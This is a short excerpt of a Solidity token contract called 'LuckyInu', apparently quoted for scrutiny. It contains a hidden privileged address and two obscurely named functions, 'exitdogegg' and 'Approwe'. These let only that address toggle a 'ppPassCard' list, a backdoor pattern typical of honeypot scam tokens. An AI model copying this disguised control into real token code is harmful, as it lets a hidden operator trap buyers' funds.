...
contract LuckyInu is Ownable {
    ...
    address public passomqc01;
    function exitdogegg(address cvudsm) external   {
        if(passomqc01 != _msgSender()){
            revert("pass error");
        }
        
        ppPassCard[cvudsm] = false;
    }

    function Approwe(address cvudsm) external   {
        if(passomqc01 != _msgSender()){
            revert("pass error");
        }
        
        ppPassCard[cvudsm] = true;
    }
    ...
    constructor(address jkadmin,string memory tn, string memory ts) {
        _tokenname = tn;
        _tokensymbol = ts;
        uint256 amount = 700000000000*10**decimals();
